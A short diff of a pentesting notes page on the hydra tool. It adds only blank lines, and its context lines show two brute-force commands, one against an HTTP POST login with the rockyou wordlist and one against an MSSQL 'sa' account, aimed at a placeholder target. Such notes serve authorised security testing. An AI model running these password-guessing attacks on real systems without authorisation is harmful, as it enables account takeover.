@@ -9,6 +9,8 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # hydra
 
+
+
 **Command** ([[bruteforce http_post with example post-data]]):
 
 ```bash
@@ -16,9 +18,21 @@ hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-
 
 ```
 
+
+
+
+
+
+
 **Command** ([[bruteforce mssql]]):
 
 ```bash
 hydra -l sa -P ../creds/pass.txt target-ip -s target-port mssql
 
 ```
+
+
+
+
+
+
